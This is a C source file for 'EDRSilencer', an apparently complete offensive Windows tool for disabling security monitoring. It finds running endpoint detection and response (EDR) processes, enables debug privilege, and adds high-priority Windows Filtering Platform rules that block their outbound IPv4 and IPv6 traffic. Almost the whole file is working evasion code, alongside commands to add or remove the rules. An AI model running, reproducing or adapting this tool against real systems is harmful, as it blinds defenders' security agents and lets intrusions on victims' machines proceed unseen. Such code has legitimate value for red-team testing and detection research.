#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wchar.h>

#include <winsock2.h>
#include <windows.h>
#include <fwpmu.h> // For Windows Filtering Platform

#include "utils.h"
#include "process.h"

// Globally unique identifiers (GUIDs) for our WFP provider and sublayer
const GUID ProviderGUID = { 0x4e27e7d4, 0x2442, 0x4891, { 0x91, 0x2e, 0x42, 0x5, 0x42, 0x8a, 0x85, 0x55 } };
const GUID SubLayerGUID = { 0x4e27e7d5, 0x2442, 0x4891, { 0x91, 0x2e, 0x42, 0x5, 0x42, 0x8a, 0x85, 0x55 } };
wchar_t ruleDescription[] = L"Blocks outbound connections for a specific EDR process";




// Helper function to apply a simple, effective block filter for a given AppID.
void applyStealthFilters(HANDLE hEngine, const GUID* subLayerGuid, PCWSTR fullPath) {
    FWP_BYTE_BLOB* appId = NULL;
    DWORD result = 0;
    UINT64 filterId = 0;

    // Attempt to get the Application ID from the full path.
    if (CustomFwpmGetAppIdFromFileName0(fullPath, &appId) != CUSTOM_SUCCESS) {
        wprintf(L"    [-] Failed to get AppID for %s\n", fullPath);
        return;
    }

    // --- Create a generic BLOCK filter structure ---
    FWPM_FILTER0 blockFilter = {0};
    blockFilter.subLayerKey = *subLayerGuid;
    blockFilter.action.type = FWP_ACTION_BLOCK; // The action is to BLOCK
    blockFilter.weight.type = FWP_UINT8;
    blockFilter.weight.uint8 = 15; // High weight to ensure it takes precedence
    blockFilter.numFilterConditions = 1;
    blockFilter.displayData.name = L"EDRSilencer Block Rule";
    blockFilter.displayData.description = ruleDescription;

    // Define the single condition: match the Application ID
    FWPM_FILTER_CONDITION0 blockCondition = {0};
    blockCondition.fieldKey = FWPM_CONDITION_ALE_APP_ID;
    blockCondition.matchType = FWP_MATCH_EQUAL;
    blockCondition.conditionValue.type = FWP_BYTE_BLOB_TYPE;
    blockCondition.conditionValue.byteBlob = appId;
    blockFilter.filterCondition = &blockCondition;

    // --- Add the filter for IPv4 ---
    blockFilter.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V4;
    result = FwpmFilterAdd0(hEngine, &blockFilter, NULL, &filterId);
    if (result != ERROR_SUCCESS) {
        wprintf(L"    [-] Failed to add IPv4 block filter for %s. Error: 0x%lX\n", fullPath, result);
    } else {
        wprintf(L"    [+] Block filter added for %s (ID: %llu, IPv4).\n", fullPath, filterId);
    }

    // --- Add the same filter for IPv6 ---
    blockFilter.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V6;
    filterId = 0; // Reset for the next call
    result = FwpmFilterAdd0(hEngine, &blockFilter, NULL, &filterId);
    if (result != ERROR_SUCCESS) {
        wprintf(L"    [-] Failed to add IPv6 block filter for %s. Error: 0x%lX\n", fullPath, result);
    } else {
        wprintf(L"    [+] Block filter added for %s (ID: %llu, IPv6).\n", fullPath, filterId);
    }

    // Clean up the AppID we created
    FreeAppId(appId);
}

// Helper function to initialize WFP engine and add provider/sublayer
BOOL initializeWfp(HANDLE* hEngine) {
    DWORD result = FwpmEngineOpen0(NULL, RPC_C_AUTHN_WINNT, NULL, NULL, hEngine);
    if (result != ERROR_SUCCESS) {
        printf("[-] FwpmEngineOpen0 failed. Error: 0x%lX\n", result);
        return FALSE;
    }

    FWPM_PROVIDER0 provider = { 0 };
    provider.providerKey = ProviderGUID;
    provider.displayData.name = EDR_PROVIDER_NAME;
    provider.displayData.description = EDR_PROVIDER_DESCRIPTION;
    result = FwpmProviderAdd0(*hEngine, &provider, NULL);
    if (result != ERROR_SUCCESS && (long)result != FWP_E_ALREADY_EXISTS) {
        printf("[-] FwpmProviderAdd0 failed. Error: 0x%lX\n", result);
        FwpmEngineClose0(*hEngine);
        return FALSE;
    }

    FWPM_SUBLAYER0 subLayer = { 0 };
    subLayer.subLayerKey = SubLayerGUID;
    subLayer.displayData.name = EDR_SUBLAYER_NAME;
    subLayer.displayData.description = EDR_SUBLAYER_DESCRIPTION;
    subLayer.providerKey = (GUID*)&ProviderGUID;
    subLayer.weight = 0x01;
    result = FwpmSubLayerAdd0(*hEngine, &subLayer, NULL);
    if (result != ERROR_SUCCESS && (long)result != FWP_E_ALREADY_EXISTS) {
        printf("[-] FwpmSubLayerAdd0 failed. Error: 0x%lX\n", result);
        FwpmEngineClose0(*hEngine);
        return FALSE;
    }

    return TRUE;
}

// Helper function to close the WFP engine handle
void shutdownWfp(HANDLE hEngine) {
    if (hEngine) {
        FwpmEngineClose0(hEngine);
        printf("[+] WFP engine handle closed.\n");
    }
}

void addProcessRule(const char* processPath) {
    EnableSeDebugPrivilege(); // Required to get handles to protected processes
    HANDLE hEngine = NULL;
    if (!initializeWfp(&hEngine)) {
        return;
    }

    wchar_t processPathW[MAX_PATH];
    mbstowcs(processPathW, processPath, MAX_PATH);

    // Directly call the filter function. It will handle AppID creation and logging.
    applyStealthFilters(hEngine, &SubLayerGUID, processPathW);

    shutdownWfp(hEngine);
}

// Function to configure network filters
void configureNetworkFilters() {
    EnableSeDebugPrivilege(); // Required to get handles to protected processes
    HANDLE hEngine = NULL;
    if (!initializeWfp(&hEngine)) {
        return;
    }

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to create snapshot of processes.\n");
        shutdownWfp(hEngine);
        return;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (isProcessInList(pe32.szExeFile)) {
                printf("[+] Found EDR process: %s\n", pe32.szExeFile);
                WCHAR fullPath[MAX_PATH];
                if (getProcessFullPath(pe32.th32ProcessID, fullPath, MAX_PATH)) {
                    // Directly call the filter function. It will handle the AppID internally.
                    applyStealthFilters(hEngine, &SubLayerGUID, fullPath);
                } else {
                    // Optional: Add a log if getting the path fails for a matched process
                    printf("    [-] Could not get full path for process: %s\n", pe32.szExeFile);
                }
            }
        } while (Process32Next(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);
    shutdownWfp(hEngine);
}

// Function to remove all rules
void removeAllRules() {
    HANDLE hEngine = NULL;
    DWORD result = 0;

    result = FwpmEngineOpen0(NULL, RPC_C_AUTHN_WINNT, NULL, NULL, &hEngine);
    if (result != ERROR_SUCCESS) {
        printf("[-] FwpmEngineOpen0 failed. Error: 0x%lX\n", result);
        return;
    }

    // By deleting the sublayer, all filters within that sublayer are automatically removed.
    result = FwpmSubLayerDeleteByKey0(hEngine, &SubLayerGUID);
    if (result == ERROR_SUCCESS) {
        printf("[+] Sublayer and all associated filters removed successfully.\n");
        } else if ((long)result == FWP_E_SUBLAYER_NOT_FOUND) {
        printf("[-] Sublayer not found. No rules to remove.\n");
    } else {
        printf("[-] FwpmSubLayerDeleteByKey0 failed. Error: 0x%lX\n", result);
    }

    // After removing the sublayer, we can remove the provider.
    result = FwpmProviderDeleteByKey0(hEngine, &ProviderGUID);
    if (result == ERROR_SUCCESS) {
        printf("[+] Provider removed successfully.\n");
        } else if ((long)result == FWP_E_PROVIDER_NOT_FOUND) {
        printf("[-] Provider not found.\n");
    } else {
        printf("[-] FwpmProviderDeleteByKey0 failed. Error: 0x%lX\n", result);
    }

    FwpmEngineClose0(hEngine);
}

// Function to remove a rule by ID
void removeRuleById(UINT64 ruleId) {
    HANDLE hEngine = NULL;
    DWORD result = 0;

    result = FwpmEngineOpen0(NULL, RPC_C_AUTHN_WINNT, NULL, NULL, &hEngine);
    if (result != ERROR_SUCCESS) {
        printf("[-] FwpmEngineOpen0 failed. Error: 0x%lX\n", result);
        return;
    }

    result = FwpmFilterDeleteById0(hEngine, ruleId);
    if (result == ERROR_SUCCESS) {
        printf("[+] Rule with ID %llu removed successfully.\n", ruleId);
        } else if ((long)result == FWP_E_FILTER_NOT_FOUND) {
        printf("[-] Rule with ID %llu not found.\n", ruleId);
    } else {
        printf("[-] Failed to remove rule with ID %llu. Error: 0x%lX\n", ruleId, result);
    }

    FwpmEngineClose0(hEngine);
}

void showHelp() {
    printf("Usage: EDRSilencer.exe <command>\n");
    printf("Version: 1.5\n\n");
    printf("Commands:\n");
     printf("  blockedr    - Add network rules to block traffic of all detected target processes.\n");
    printf("  add <path>  - Add a network rule to block traffic for a specific process.\n");
    printf("                Example: EDRSilencer.exe add \"C:\\Windows\\System32\\curl.exe\"\n");
    printf("  removeall   - Remove all network rules applied by this tool.\n");
    printf("  remove <id> - Remove a specific network rule by its ID.\n");
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        showHelp();
        return 1;
    }

    if (_stricmp(argv[1], "-h") == 0 || _stricmp(argv[1], "--help") == 0) {
        showHelp();
        return 1;
    }
    
    if (!CheckProcessIntegrityLevel()) {
        return 1;
    }

    if (strcmp(argv[1], "blockedr") == 0) {
        configureNetworkFilters();
    } else if (strcmp(argv[1], "add") == 0) {
        if (argc < 3) {
            printf("[-] Missing argument. Please provide the full path of the process.\n");
            return 1;
        }
        addProcessRule(argv[2]);
    } else if (strcmp(argv[1], "removeall") == 0) {
        removeAllRules();
    } else if (strcmp(argv[1], "remove") == 0) {
        if (argc < 3) {
            printf("[-] Missing argument. Please provide the rule ID.\n");
            return 1;
        }
        char *endptr;
        errno = 0;
        UINT64 ruleId = strtoull(argv[2], &endptr, 10);
        if (errno != 0 || endptr == argv[2]) {
            printf("[-] Invalid rule ID provided.\n");
            return 1;
        }
        removeRuleById(ruleId);
    } else {
        printf("[-] Invalid command: \"%s\". Use -h for help.\n", argv[1]);
        return 1;
    }
    return 0;
}